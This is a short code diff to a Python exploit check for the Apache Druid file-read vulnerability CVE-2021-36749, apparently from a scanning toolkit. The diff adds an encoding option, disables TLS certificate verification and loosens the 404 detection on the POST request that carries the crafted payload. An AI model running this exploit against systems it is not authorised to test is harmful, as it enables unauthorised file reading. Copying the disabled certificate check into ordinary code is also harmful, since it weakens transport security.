@@ -56,7 +56,7 @@ lists = [
 ]
 
 
-def Apache_Druid_any_path(inurl, timeout=6):
+def Apache_Druid_any_path(inurl, timeout=6,code='gbk'):
     main.print_blue('CVE-2021-36749')
     re = ''
     for list in lists:
@@ -79,10 +79,11 @@ def Apache_Druid_any_path(inurl, timeout=6):
                                                                                                          "column": "no_ such_ column",
                                                                                                          "missingValue": "2010-01-01T00:00:00Z"}}}}},
                      "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
-        r = requests.post(url, headers=headerss, json=post_data, timeout=timeout)
+        r = requests.post(url, headers=headerss, json=post_data, timeout=timeout, verify=False)
+        r.encoding = code
         re = re + r.text
         if not 'Error 404 Not Found' in re and not 'Not Found' in re:
-            if not '"status": "404"' in re:
+            if not '404' in re:
                 return '成功返回：' + re
             else:
                 re = re + '失败'
